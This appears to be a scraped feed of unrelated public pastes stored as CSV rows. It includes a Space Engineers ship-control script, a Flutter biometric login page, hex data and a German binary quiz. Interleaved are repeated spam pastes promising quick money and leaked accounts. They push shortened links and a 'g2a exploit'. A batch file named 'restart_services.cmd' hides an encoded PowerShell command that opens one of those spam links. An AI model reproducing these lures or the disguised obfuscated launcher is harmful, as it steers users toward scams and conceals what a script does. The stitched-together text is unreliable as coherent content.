+    Vector3D gridDirection = Vector3D.TransformNormal(worldDirection, worldToGridRotation);
+
+    // Apply thrust component-wise (simplified)
+    // Apply strength * absolute value of component to the thrusters in that grid direction
+    SetThrusterOverrides((float)(strength * Math.Max(0, gridDirection.Y)), Base6Directions.Direction.Up); // Push up in grid +Y
+    SetThrusterOverrides((float)(strength * Math.Max(0, -gridDirection.Y)), Base6Directions.Direction.Down); // Push down in grid -Y
+    SetThrusterOverrides((float)(strength * Math.Max(0, gridDirection.Z)), Base6Directions.Direction.Forward); // Push forward in grid +Z
+    SetThrusterOverrides((float)(strength * Math.Max(0, -gridDirection.Z)), Base6Directions.Direction.Backward); // Push backward in grid -Z
+    SetThrusterOverrides((float)(strength * Math.Max(0, -gridDirection.X)), Base6Directions.Direction.Left); // Push left in grid -X
+    SetThrusterOverrides((float)(strength * Math.Max(0, gridDirection.X)), Base6Directions.Direction.Right); // Push right in grid +X
+}
+
+
+void SetGyroOverride(bool enable, Vector3D? pitchYawRollRates = null)
+{
+    foreach (var gyro in gyros)
+    {
+        // If GyroOverride, Pitch, Yaw, Roll are causing errors, this is a core API issue.
+        gyro.GyroOverride = enable;
+        if (enable && pitchYawRollRates.HasValue)
+        {
+            // Gyro override takes radians per second
+            gyro.Pitch = (float)pitchYawRollRates.Value.X;
+            gyro.Yaw = (float)pitchYawRollRates.Value.Y;
+            gyro.Roll = (float)pitchYawRollRates.Value.Z;
+        }
+        else if (enable && !pitchYawRollRates.HasValue)
+        {
+            // Set rates to 0 if overriding without specific rates
+            gyro.Pitch = 0;
+            gyro.Yaw = 0;
+            gyro.Roll = 0;
+        }
+    }
+}
+
+// Aligns the grid's WorldMatrix.Up vector to a desiredWorldUp vector
+// Applies angular velocity using gyros proportional to the alignment error
+void AlignGridToVector(Vector3D desiredDirection, double multiplier)
+{
+    if (gyros.Count == 0 || remoteControl == null) return;
+
+    Matrix worldMatrix = remoteControl.WorldMatrix;
+    Vector3D forward = worldMatrix.Forward;
+    
+    // Calculate rotation
+    double angle = Math.Acos(Vector3D.Dot(forward, desiredDirection));
+    Vector3D rotationAxis = Vector3D.Cross(forward, desiredDirection);
+    
+    if (rotationAxis.LengthSquared() < 0.001)
+    {
+        SetGyroOverride(true, Vector3D.Zero);
+        return;
+    }
+
+    rotationAxis = Vector3D.Normalize(rotationAxis);
+    
+    // Calculate angular velocity
+    Vector3D worldAngularVelocity = rotationAxis * angle * multiplier;
+    
+    // Convert to local space
+    Vector3D localAngularVelocity = Vector3D.TransformNormal(worldAngularVelocity, Matrix.Transpose(worldMatrix));
+    
+    Vector3D gyroRates = new Vector3D(
+        -localAngularVelocity.X,
+        localAngularVelocity.Y,
+        -localAngularVelocity.Z
+    );
+
+    SetGyroOverride(true, gyroRates);
+}
+
+
+void DeployParachutes()
+{
+    foreach (var chute in parachutes)
+    {
+        // If OpenDoor is causing errors, this is a core API issue.
+        chute.OpenDoor();
+        // chute.AutoDeploy = true; // Could use auto deploy as well, but manual is more controllable
+    }
+}
+
+bool TryParseGps(string gpsString, out Vector3D coords)
+{
+    coords = Vector3D.Zero;
+    if (!gpsString.StartsWith(""GPS:"", StringComparison.OrdinalIgnoreCase)) return false;
+
+    string[] parts = gpsString.Substring(4).Split(':');
+    if (parts.Length != 4) return false; // Name, X, Y, Z
+
+    double x = 0.0, y = 0.0, z = 0.0; // Initialized variables
+
+    // Using basic TryParse as Globalization is not available
+    // Note: This version might be sensitive to regional number formats (comma vs dot)
+    // If double.TryParse is causing errors here, and the CultureInfo version didn't work,
+    // it's a fundamental issue with double parsing in your environment.
+    if (double.TryParse(parts[1], out x) &&
+        double.TryParse(parts[2], out y) &&
+        double.TryParse(parts[3], out z))
+    {
+        coords = new Vector3D(x, y, z);
+        return true;
+    }
+
+    return false;
+}"
+45eqS35e,EARN $900 INSTANTLY 2025 EI,thatkidxX,JavaScript,Wednesday 7th of May 2025 06:55:03 AM CDT," 
+Pdf https://tinyurl.com/freshleaks
+
+Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site
+
+OyecG3XRUh
+"
+vc0rRiz2,Products.js,QAQA-468,JavaScript,Wednesday 7th of May 2025 06:52:51 AM CDT,628938 - check it out at http://tinyurl.com/new2025may
+TCCGpfFS,Make $1000 15-MINUTES  (BEGINNER) 6D,fnhacksxd,JavaScript,Wednesday 7th of May 2025 06:48:08 AM CDT," 
+Pdf https://tinyurl.com/freshleaks
+
+Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site
+
+NgqlCSp7Nx
+"
+ZKHSW2C1,Make $1000 15 - MINUTES(BEGINNER) YR,QAQA-468,JavaScript,Wednesday 7th of May 2025 06:42:08 AM CDT,150804 - check it out at http://tinyurl.com/new2025may
+CFrTr8j1,EARN $900 INSTANTLY 2025 EI,fnhacksxd,JavaScript,Wednesday 7th of May 2025 06:41:23 AM CDT," 
+Pdf https://tinyurl.com/freshleaks
+
+Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site
+
+LENeWoOdDD
+"
+tV6R5rLr,Make $1000 15-MINUTES (BEGINNER) OV,fnhacksxd,JavaScript,Wednesday 7th of May 2025 06:34:31 AM CDT," 
+Pdf https://tinyurl.com/freshleaks
+
+Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site
+
+TCHzN3XtOp
+"
+PwUurCXQ,authentication biometric face finger flutter,muhaiminurabir,Dart,Wednesday 7th of May 2025 06:32:34 AM CDT,"import 'dart:io';
+
+import 'package:firebase_auth/firebase_auth.dart' as fAuth;
+import 'package:flutter/gestures.dart';
+import 'package:flutter/material.dart';
+import 'package:flutter/services.dart';
+import 'package:flutter_svg/svg.dart';
+import 'package:google_fonts/google_fonts.dart';
+import 'package:investorv2/generated/assets.dart';
+import 'package:investorv2/singleton/shared_pref.dart';
+import 'package:investorv2/utility/apple_signin.dart';
+import 'package:investorv2/utility/baseFunctions.dart';
+import 'package:investorv2/utility/colors.dart';
+import 'package:investorv2/utility/customStrings.dart';
+import 'package:investorv2/utility/google_signin.dart';
+import 'package:investorv2/utility/routes.dart';
+import 'package:investorv2/utility/valueStrings.dart';
+import 'package:investorv2/view/common/progressBar.dart';
+import 'package:local_auth/local_auth.dart';
+import 'package:provider/provider.dart';
+
+import '../../provider/auth_provider.dart';
+import '../../singleton/logger.dart';
+
+class LoginPage extends StatefulWidget {
+  const LoginPage({super.key});
+
+  @override
+  LoginPageState createState() => LoginPageState();
+}
+
+class LoginPageState extends State<LoginPage> {
+  final GlobalKey<FormState> _formKey = GlobalKey<FormState>();
+  final emailController = TextEditingController();
+  final passwordController = TextEditingController();
+  bool passwordVisible = true;
+  late AuthProvider provider;
+  bool isAppleSignInAvailable = false;
+
+  final LocalAuthentication auth = LocalAuthentication();
+  _SupportState _supportState = _SupportState.unknown;
+  bool _canCheckBiometrics = false;
+  List<BiometricType>? _availableBiometrics;
+  String _authorized = 'Not Authorized';
+  bool _isAuthenticating = false;
+
+  @override
+  void initState() {
+    provider = Provider.of<AuthProvider>(context, listen: false);
+    if (Platform.isIOS) {
+      appleSigninAvailability();
+    }
+    super.initState();
+    auth.isDeviceSupported().then(
+      (bool isSupported) => setState(() {
+        _supportState =
+            isSupported ? _SupportState.supported : _SupportState.unsupported;
+      }),
+    );
+  }
+
+  @override
+  Widget build(BuildContext context) {
+    return SafeArea(
+      child: Center(
+        child: SingleChildScrollView(
+          physics: ScrollPhysics(),
+          child: Padding(
+            padding: const EdgeInsets.all(20.0),
+            child: Column(
+              children: <Widget>[
+                SizedBox(
+                  child: SvgPicture.asset(
+                    ""assets/images/ic_ifarmer.svg"",
+                    height: 40,
+                    width: 100,
+                  ),
+                ),
+                SizedBox(height: 30),
+                Form(
+                  key: _formKey,
+                  child: Column(
+                    children: <Widget>[
+                      Align(
+                        alignment: AlignmentDirectional.centerStart,
+                        child: Text(
+                          CustomStrings.email,
+                          style: GoogleFonts.poppins(
+                            fontSize: 14,
+                            fontWeight: FontWeight.w400,
+                            color: ProjectColors.black4,
+                          ),
+                          maxLines: 1,
+                          overflow: TextOverflow.ellipsis,
+                          softWrap: true,
+                          textAlign: TextAlign.start,
+                        ),
+                      ),
+                      SizedBox(height: 10),
+                      TextFormField(
+                        style: GoogleFonts.poppins(
+                          color: ProjectColors.black4,
+                          fontSize: 14,
+                          fontWeight: FontWeight.w500,
+                        ),
+                        maxLines: 1,
+                        controller: emailController,
+                        validator: (value) {
+                          if (value == null || value.isEmpty) {
+                            return CustomStrings.required;
+                          } else if (!RegExp(
+                            r""^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$"",
+                          ).hasMatch(value)) {
+                            return CustomStrings.invalidEmail;
+                          }
+                          return null; // Valid input
+                        },
+                        keyboardType: TextInputType.emailAddress,
+                        decoration: InputDecoration(
+                          fillColor: ProjectColors.gray,
+                          filled: true,
+                          hintStyle: GoogleFonts.poppins(
+                            color: ProjectColors.black4.withValues(alpha: 90),
+                            fontSize: 14,
+                            fontWeight: FontWeight.w500,
+                          ),
+                          errorBorder: OutlineInputBorder(
+                            borderRadius: BorderRadius.circular(10.0),
+                            borderSide: BorderSide(
+                              color: Colors.red.shade800,
+                              width: 0.5,
+                            ),
+                          ),
+                          focusedBorder: OutlineInputBorder(
+                            borderRadius: BorderRadius.circular(10.0),
+                            borderSide: BorderSide(
+                              color: ProjectColors.primaryColor,
+                            ),
+                          ),
+                          focusedErrorBorder: OutlineInputBorder(
+                            borderRadius: BorderRadius.circular(10.0),
+                            borderSide: BorderSide(
+                              color: Colors.red.shade800,
+                              width: 0.5,
+                            ),
+                          ),
+                          contentPadding: EdgeInsets.fromLTRB(
+                            20.0,
+                            15.0,
+                            20.0,
+                            15.0,
+                          ),
+                          hintText: CustomStrings.emailHint,
+                          border: OutlineInputBorder(
+                            borderSide: BorderSide.none,
+                            borderRadius: BorderRadius.circular(10.0),
+                          ),
+                        ),
+                      ),
+                      SizedBox(height: 20.0),
+                      Align(
+                        alignment: AlignmentDirectional.centerStart,
+                        child: Text(
+                          CustomStrings.pin,
+                          style: GoogleFonts.poppins(
+                            fontSize: 14,
+                            fontWeight: FontWeight.w400,
+                            color: ProjectColors.black4,
+                          ),
+                          maxLines: 1,
+                          overflow: TextOverflow.ellipsis,
+                          softWrap: true,
+                          textAlign: TextAlign.start,
+                        ),
+                      ),
+                      SizedBox(height: 10),
+                      TextFormField(
+                        style: GoogleFonts.poppins(
+                          color: ProjectColors.black4,
+                          fontSize: 14,
+                          fontWeight: FontWeight.w500,
+                        ),
+                        maxLines: 1,
+                        controller: passwordController,
+                        inputFormatters: [
+                          FilteringTextInputFormatter.digitsOnly,
+                        ],
+                        validator: (value) {
+                          if (value!.trim().isEmpty) {
+                            return CustomStrings.required;
+                          }
+                          if (value.trim().length < 6) {
+                            return CustomStrings.min6;
+                          }
+                          return null;
+                        },
+                        obscureText: passwordVisible,
+                        keyboardType: TextInputType.number,
+                        decoration: InputDecoration(
+                          fillColor: ProjectColors.gray,
+                          filled: true,
+                          hintStyle: GoogleFonts.poppins(
+                            color: ProjectColors.black4.withValues(alpha: 90),
+                            fontSize: 14,
+                            fontWeight: FontWeight.w500,
+                          ),
+                          errorBorder: OutlineInputBorder(
+                            borderRadius: BorderRadius.circular(10.0),
+                            borderSide: BorderSide(
+                              color: Colors.red.shade800,
+                              width: 0.5,
+                            ),
+                          ),
+                          focusedBorder: OutlineInputBorder(
+                            borderRadius: BorderRadius.circular(10.0),
+                            borderSide: BorderSide(
+                              color: ProjectColors.primaryColor,
+                            ),
+                          ),
+                          focusedErrorBorder: OutlineInputBorder(
+                            borderRadius: BorderRadius.circular(10.0),
+                            borderSide: BorderSide(
+                              color: Colors.red.shade800,
+                              width: 0.5,
+                            ),
+                          ),
+                          contentPadding: EdgeInsets.fromLTRB(
+                            20.0,
+                            15.0,
+                            20.0,
+                            15.0,
+                          ),
+                          hintText: CustomStrings.pinHint,
+                          border: OutlineInputBorder(
+                            borderSide: BorderSide.none,
+                            borderRadius: BorderRadius.circular(10.0),
+                          ),
+                          suffixIcon: IconButton(
+                            icon: Icon(
+                              passwordVisible
+                                  ? Icons.visibility
+                                  : Icons.visibility_off,
+                              color: ProjectColors.black4,
+                            ),
+                            onPressed: () {
+                              setState(() {
+                                passwordVisible = !passwordVisible;
+                              });
+                            },
+                          ),
+                        ),
+                      ),
+                    ],
+                  ),
+                ),
+                Align(
+                  alignment: AlignmentDirectional.centerStart,
+                  child: TextButton(
+                    onPressed: () {
+                      Navigator.pushNamed(context, forgetPasswordPage);
+                    },
+                    child: Text(
+                      CustomStrings.forgotPassword,
+                      style: GoogleFonts.poppins(
+                        fontSize: 12,
+                        fontWeight: FontWeight.w400,
+                        color: ProjectColors.primaryColor,
+                      ),
+                      maxLines: 1,
+                      overflow: TextOverflow.ellipsis,
+                      softWrap: true,
+                      textAlign: TextAlign.start,
+                    ),
+                  ),
+                ),
+                Row(
+                  mainAxisAlignment: MainAxisAlignment.start,
+                  crossAxisAlignment: CrossAxisAlignment.center,
+                  children: [
+                    Expanded(
+                      child: ElevatedButton(
+                        style: ButtonStyle(
+                          backgroundColor: WidgetStateProperty.all(
+                            ProjectColors.primaryColor,
+                          ),
+                          padding: WidgetStateProperty.all(
+                            EdgeInsets.fromLTRB(8, 16, 8, 16),
+                          ),
+                          shape: WidgetStatePropertyAll(
+                            RoundedRectangleBorder(
+                              borderRadius: BorderRadius.circular(10),
+                            ),
+                          ),
+                        ),
+                        onPressed: () {
+                          if (_formKey.currentState!.validate()) {
+                            provider
+                                .loginCall(
+                                  email: emailController.text.trim(),
+                                  password: passwordController.text,
+                                )
+                                .then((statusCode) {
+                                  if (statusCode == 200) {
+                                    SharedPref.setModel(
+                                      loginModel,
+                                      context
+                                          .read<AuthProvider>()
+                                          .logInResponse,
+                                    );
+                                    SharedPref.setString(
+                                      token,
+                                      context
+                                          .read<AuthProvider>()
+                                          .logInResponse
+                                          .authToken!,
+                                    );
+                                    if (!context
+                                        .read<AuthProvider>()
+                                        .logInResponse
+                                        .privacyFlag!) {
+                                      Navigator.pushReplacementNamed(
+                                        context,
+                                        privacyPolicyPage,
+                                        arguments: false,
+                                      );
+                                    } else {
+                                      Navigator.pushReplacementNamed(
+                                        context,
+                                        loggedHomePage,
+                                      );
+                                    }
+                                  }
+                                });
+                          }
+                        },
+                        child: Row(
+                          mainAxisAlignment: MainAxisAlignment.center,
+                          spacing: 6,
+                          children: [
+                            SvgPicture.asset(
+                              ""assets/images/ic_login.svg"",
+                              height: 24,
+                              width: 24,
+                              colorFilter: ColorFilter.mode(
+                                ProjectColors.white,
+                                BlendMode.srcIn,
+                              ),
+                            ),
+                            Text(
+                              CustomStrings.login,
+                              style: GoogleFonts.poppins(
+                                fontWeight: FontWeight.w500,
+                                fontSize: 16,
+                                color: ProjectColors.white,
+                              ),
+                            ),
+                          ],
+                        ),
+                      ),
+                    ),
+                    Visibility(
+                      visible: _supportState == _SupportState.supported,
+                      child: IconButton(
+                        onPressed: () {
+                          _checkBiometrics().then((value) {
+                            if (_canCheckBiometrics) {
+                              _getAvailableBiometrics().then((value) {
+                                _authenticateWithBiometrics().then((value) {
+                                  Log().showMessageToast(message: _authorized);
+                                });
+                              });
+                            }
+                          });
+                        },
+                        icon: Image(
+                          image: AssetImage(Assets.imagesIcBiometric),
+                          width: 60,
+                          height: 60,
+                        ),
+                      ),
+                    ),
+                  ],
+                ),
+                SizedBox(height: 10),
+                SizedBox(
+                  height: 1,
+                  child: Container(
+                    color: ProjectColors.black6,
+                    padding: EdgeInsets.only(top: 10, bottom: 10),
+                  ),
+                ),
+                SizedBox(height: 10),
+                Align(
+                  alignment: AlignmentDirectional.centerStart,
+                  child: RichText(
+                    textAlign: TextAlign.start,
+                    text: TextSpan(
+                      style: GoogleFonts.poppins(
+                        fontSize: 12.0,
+                        color: ProjectColors.black4,
+                        fontWeight: FontWeight.w400,
+                      ),
+                      children: <TextSpan>[
+                        TextSpan(
+                          text: CustomStrings.doNotAccount,
+                          style: GoogleFonts.poppins(
+                            fontSize: 12.0,
+                            color: ProjectColors.black4,
+                            fontWeight: FontWeight.w400,
+                          ),
+                        ),
+                        TextSpan(
+                          text: CustomStrings.signUp,
+                          recognizer:
+                              TapGestureRecognizer()
+                                ..onTap = () {
+                                  Navigator.pushNamed(
+                                    context,
+                                    registrationPage,
+                                  );
+                                },
+                          style: GoogleFonts.poppins(
+                            fontSize: 12.0,
+                            color: ProjectColors.primaryColor,
+                            fontWeight: FontWeight.w400,
+                          ),
+                        ),
+                      ],
+                    ),
+                  ),
+                ),
+                Container(
+                  margin: EdgeInsets.only(top: 20.0),
+                  child: Column(
+                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
+                    mainAxisSize: MainAxisSize.max,
+                    children: <Widget>[
+                      Card(
+                        margin: EdgeInsets.all(0.0),
+                        elevation: 2,
+                        shape: RoundedRectangleBorder(
+                          side: BorderSide(
+                            color: ProjectColors.primaryColor,
+                            width: 0.5,
+                          ),
+                          borderRadius: BorderRadius.circular(4.0),
+                        ),
+                        child: GestureDetector(
+                          onTap: () async {
+                            goggleSignIn();
+                          },
+                          child: Container(
+                            color: ProjectColors.white,
+                            padding: EdgeInsets.symmetric(vertical: 10.0),
+                            child: Row(
+                              mainAxisAlignment: MainAxisAlignment.center,
+                              crossAxisAlignment: CrossAxisAlignment.center,
+                              children: <Widget>[
+                                SvgPicture.asset(
+                                  ""assets/images/google.svg"",
+                                  height: 25.0,
+                                  width: 18.0,
+                                ),
+                                SizedBox(width: 10),
+                                Text(
+                                  CustomStrings.google,
+                                  style: TextStyle(
+                                    fontSize: 14,
+                                    fontWeight: FontWeight.w500,
+                                  ),
+                                ),
+                              ],
+                            ),
+                          ),
+                        ),
+                      ),
+                      SizedBox(height: 15),
+                      Visibility(
+                        visible: isAppleSignInAvailable,
+                        child: Card(
+                          margin: EdgeInsets.all(0.0),
+                          elevation: 2,
+                          color: Colors.black,
+                          shape: RoundedRectangleBorder(
+                            borderRadius: BorderRadius.circular(4.0),
+                          ),
+                          child: GestureDetector(
+                            onTap: () {
+                              appleSignIn();
+                            },
+                            child: Container(
+                              padding: EdgeInsets.symmetric(
+                                vertical: 10.0,
+                                horizontal: 10.0,
+                              ),
+                              child: Row(
+                                mainAxisAlignment: MainAxisAlignment.center,
+                                crossAxisAlignment: CrossAxisAlignment.center,
+                                children: <Widget>[
+                                  SvgPicture.asset(
+                                    ""assets/images/apple_logo.svg"",
+                                    height: 25.0,
+                                    width: 18.0,
+                                  ),
+                                  SizedBox(width: 10),
+                                  Text(
+                                    CustomStrings.apple,
+                                    style: TextStyle(
+                                      fontSize: 14,
+                                      color: Colors.white,
+                                      fontWeight: FontWeight.w500,
+                                    ),
+                                  ),
+                                ],
+                              ),
+                            ),
+                          ),
+                        ),
+                      ),
+                    ],
+                  ),
+                ),
+                SizedBox(height: 10),
+              ],
+            ),
+          ),
+        ),
+      ),
+    );
+  }
+
+  appleSigninAvailability() async {
+    var value = await AppleAuthService.isAppleSignInAvailable();
+    setState(() {
+      isAppleSignInAvailable = value;
+    });
+  }
+
+  appleSignIn() async {
+    fAuth.UserCredential? userCredential;
+    userCredential = await AppleAuthService().signInWithApple();
+    String name = SharedPref.getString(""appleDisplayName"");
+    Log().printInfo(""Saved Name:$name"");
+    if (userCredential != null) {
+      CustomProgressDialog.show(message: ""Signing In..."", isDismissible: false);
+      fAuth.User? user = userCredential.user;
+      Map<String, dynamic> map = {};
+      if (user != null) {
+        map[""uid""] = user.uid;
+        map['provider'] = ""apple"";
+        if (user.email != null) {
+          map['email'] = user.email;
+          BaseFunctions().setEmail(user.email!);
+        }
+        map['name'] = name;
+        if (user.photoURL != null) {
+          map['image'] = user.photoURL ?? """";
+        }
+
+        provider.socialLogin(map: map).then((statusCode) {
+          Log().printInfo(statusCode.toString());
+          if (statusCode == 200) {
+            if (statusCode == 200) {
+              SharedPref.setModel(
+                loginModel,
+                context.read<AuthProvider>().logInResponse,
+              );
+              SharedPref.setString(
+                token,
+                context.read<AuthProvider>().logInResponse.authToken!,
+              );
+              if (!context.read<AuthProvider>().logInResponse.privacyFlag!) {
+                Navigator.pushReplacementNamed(
+                  context,
+                  privacyPolicyPage,
+                  arguments: false,
+                );
+              } else {
+                Navigator.pushReplacementNamed(context, loggedHomePage);
+              }
+            }
+          }
+        });
+      } else {
+        CustomProgressDialog.hide();
+      }
+    } else {
+      CustomProgressDialog.hide();
+    }
+  }
+
+  goggleSignIn() async {
+    fAuth.UserCredential? userCredential;
+
+    userCredential = await GoogleAuthService().signInWithGoogle();
+
+    // Access user details
+    if (userCredential != null) {
+      CustomProgressDialog.show(message: ""Signing In..."", isDismissible: false);
+      fAuth.User? user = userCredential.user;
+      if (user != null) {
+        Log().printInfo(""User UID: ${user.uid}"");
+        Log().printInfo(""User Display Name: ${user.displayName}"");
+        Log().printInfo(""User Email: ${user.email}"");
+        Log().printInfo(""User Photo URL: ${user.photoURL}"");
+
+        Map<String, dynamic> map = {};
+        map['uid'] = user.uid;
+        map['provider'] = ""google"";
+        if (user.email != null) {
+          map['email'] = user.email ?? """";
+          BaseFunctions().setEmail(user.email ?? """");
+        }
+        if (user.displayName != null) {
+          map['name'] = user.displayName ?? """";
+          BaseFunctions().setEmail(user.displayName ?? """");
+        }
+
+        map['image'] = user.photoURL ?? """";
+
+        provider.socialLogin(map: map).then((statusCode) {
+          Log().printInfo(statusCode.toString());
+          if (statusCode == 200) {
+            if (statusCode == 200) {
+              SharedPref.setModel(
+                loginModel,
+                context.read<AuthProvider>().logInResponse,
+              );
+              SharedPref.setString(
+                token,
+                context.read<AuthProvider>().logInResponse.authToken!,
+              );
+              if (!context.read<AuthProvider>().logInResponse.privacyFlag!) {
+                Navigator.pushReplacementNamed(
+                  context,
+                  privacyPolicyPage,
+                  arguments: false,
+                );
+              } else {
+                Navigator.pushReplacementNamed(context, loggedHomePage);
+              }
+            }
+          }
+        });
+      } else {
+        CustomProgressDialog.hide();
+      }
+    } else {
+      CustomProgressDialog.hide();
+    }
+  }
+
+  Future<void> _checkBiometrics() async {
+    late bool canCheckBiometrics;
+    try {
+      canCheckBiometrics = await auth.canCheckBiometrics;
+    } on PlatformException catch (e) {
+      canCheckBiometrics = false;
+      print(e);
+    }
+    if (!mounted) {
+      return;
+    }
+    setState(() {
+      _canCheckBiometrics = canCheckBiometrics;
+    });
+  }
+
+  Future<void> _getAvailableBiometrics() async {
+    late List<BiometricType> availableBiometrics;
+    try {
+      availableBiometrics = await auth.getAvailableBiometrics();
+    } on PlatformException catch (e) {
+      availableBiometrics = <BiometricType>[];
+      print(e);
+    }
+    if (!mounted) {
+      return;
+    }
+    setState(() {
+      _availableBiometrics = availableBiometrics;
+    });
+  }
+
+  Future<void> _authenticate() async {
+    bool authenticated = false;
+    try {
+      setState(() {
+        _isAuthenticating = true;
+        _authorized = 'Authenticating';
+      });
+      authenticated = await auth.authenticate(
+        localizedReason: 'Let OS determine authentication method',
+        options: const AuthenticationOptions(stickyAuth: true),
+      );
+      setState(() {
+        _isAuthenticating = false;
+      });
+    } on PlatformException catch (e) {
+      setState(() {
+        _isAuthenticating = false;
+        _authorized = 'Error - ${e.message}';
+      });
+      return;
+    }
+    if (!mounted) {
+      return;
+    }
+    setState(
+      () => _authorized = authenticated ? 'Authorized' : 'Not Authorized',
+    );
+  }
+
+  Future<void> _authenticateWithBiometrics() async {
+    bool authenticated = false;
+    try {
+      setState(() {
+        _isAuthenticating = true;
+        _authorized = 'Authenticating';
+      });
+      authenticated = await auth.authenticate(
+        localizedReason:
+            'Scan your fingerprint (or face or whatever) to authenticate',
+        options: const AuthenticationOptions(
+          stickyAuth: true,
+          biometricOnly: true,
+        ),
+      );
+      setState(() {
+        _isAuthenticating = false;
+        _authorized = 'Authenticating';
+      });
+    } on PlatformException catch (e) {
+      setState(() {
+        _isAuthenticating = false;
+        _authorized = 'Error - ${e.message}';
+      });
+      return;
+    }
+    if (!mounted) {
+      return;
+    }
+    final String message = authenticated ? 'Authorized' : 'Not Authorized';
+    setState(() {
+      _authorized = message;
+    });
+  }
+
+  Future<void> _cancelAuthentication() async {
+    await auth.stopAuthentication();
+    setState(() => _isAuthenticating = false);
+  }
+}
+
+enum _SupportState { unknown, supported, unsupported }
+"
+iXzHpcpg,Products.js,QAQA-468,JavaScript,Wednesday 7th of May 2025 06:31:47 AM CDT,295909 - check it out at http://tinyurl.com/new2025may
+katJFnYJ,EARN $900 INSTANTLY 2025⭐ DG,fnhacksxd,JavaScript,Wednesday 7th of May 2025 06:27:46 AM CDT," 
+Pdf https://tinyurl.com/freshleaks
+
+Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site
+
+BWxIAhEia3
+"
+C40GTGQ9,Leaked Accounts - Fresh HitsUntitled,wasawdawd,JavaScript,Wednesday 7th of May 2025 06:21:04 AM CDT,476432 - check it out at http://tinyurl.com/new2025may
+SDfuRbd3,Make $1000 15-MINUTES  (BEGINNER) 6D,fnhacksxd,JavaScript,Wednesday 7th of May 2025 06:21:01 AM CDT," 
+Pdf https://tinyurl.com/freshleaks
+
+Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site
+
+fpVSe3kznF
+"
+nqCeJY8c,EARN $900 INSTANTLY 2025 EI,fnhacksxd,JavaScript,Wednesday 7th of May 2025 06:14:16 AM CDT," 
+Pdf https://tinyurl.com/freshleaks
+
+Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site
+
+VkTCLgJn18
+"
+jc4NUYRV,free hf ebooks,wasawdawd,JavaScript,Wednesday 7th of May 2025 06:11:03 AM CDT,108071 - check it out at http://tinyurl.com/new2025may
+frF96mwp,Products.js,wasawdawd,JavaScript,Wednesday 7th of May 2025 06:01:02 AM CDT,809338 - check it out at http://tinyurl.com/new2025may
+K879KeUM,restart_services.cmd,yaseenshawkinour,Batch,Wednesday 7th of May 2025 06:00:47 AM CDT,"@ECHO OFF
+TITLE $~foddyn: Executor v1.1
+@REM ... all the other handlers ...
+if %choice%==tutorial GOTO tutorial
+
+:openHf
+ECHO Launching PowerShell command...
+powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0AYgA0AGMAZQA0ADkAOQBmAA==
+EXIT /b
+"
+t1W7aZ1a,dataNone,TestGuy1,JSON,Wednesday 7th of May 2025 06:00:05 AM CDT,"{
+  status: 'Success',
+  method: 'server',
+  maindata: 'a9cdcf866e35d18fcbb3c46ed85889c9f74c121b745e1f32651dc346b0cada9fa58dcbd31828a0430e3089918e2ec3fe687d6c0c6046cebca2e8aa0c50a1e1e5f219ba39aa315328dca43b2b3af68546a52cb8b132e57b400d0925e9a3d98b49d78b22206cae32032b9ec4ec7aa4f35c353f7eee816f8c905038ca183d348fe9',
+  otherdata: [
+    'ea07163e59ab2931fe5e13ecd5d879d2',
+    '693669c3d66b93569fb7e632cbf06720',
+    'ad5c60c0be58c79163048e46b575cc42',
+    'c0756c549141c86f28648ffd1fb321f3',
+    'a36b08a47368b11a660fbcd1ba13a3e2',
+    '51347510c4fac8cb619a79aaa1fd4312',
+    '937a98d1a8489d07b5eb05fb06227866',
+    '06f3a60ecb6b517c16f078a588c22e5f'
+  ]
+}"
+e0avqD4s,Untitled,Giuseppe,Visual Pro Log,Wednesday 7th of May 2025 05:55:09 AM CDT,"<!DOCTYPE html>
+<html lang=""de"">
+<head>
+  <meta charset=""UTF-8"">
+  <title>Binär-Quiz: Dezimal zu Binär</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 20px;
+      max-width: 1000px;
+      margin: auto;
+    }
+    h1 {
+      text-align: center;
+    }
+    .quiz-section {
+      margin-bottom: 30px;
+      border-bottom: 1px solid #ccc;
+      padding-bottom: 20px;
+    }
+    .bit-table {
+      display: flex;
+      gap: 10px;
+      margin: 10px 0;
+    }
+    .bit-table input[type=""text""] {
+      width: 40px;
+      text-align: center;
+      font-weight: bold;
+    }
+    .binary-answer {
+      margin-top: 10px;
+    }
+    .binary-answer input {
+      width: 200px;
+      padding: 5px;
+      font-size: 16px;
+    }
+    .result {
+      font-weight: bold;
+      margin-top: 15px;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      margin: 10px 0;
+    }
+  </style>
+</head>
+<body>
+  <h1>Dezimal zu Binär: Lernhilfe mit Tabelle</h1>
+
+  <div id=""quiz-container""></div>
+  <button onclick=""evaluateQuiz()"">Auswerten</button>
+  <div id=""final-score"" class=""result""></div>
+
+  <script>
+    const zahlen = Array.from({ length: 40 }, (_, i) => 100 + i * 3);
+    const container = document.getElementById(""quiz-container"");
+
+    zahlen.forEach((zahl, idx) => {
+      const section = document.createElement(""div"");
+      section.className = ""quiz-section"";
+      section.innerHTML = `
+        <h3>${idx + 1}. Dezimalzahl: ${zahl}</h3>
+        <div class=""bit-table"">
+          ${[128,64,32,16,8,4,2,1].map(v => `<div><label>${v}</label><br><input type='text' maxlength='1'></div>`).join('')}
+        </div>
+        <div class=""bit-table"">
+          ${[...Array(8)].map(() => `<input type='text' maxlength='1'>`).join('')}
+        </div>
+        <div class=""binary-answer"">
+          <label>Binärdarstellung: </label>
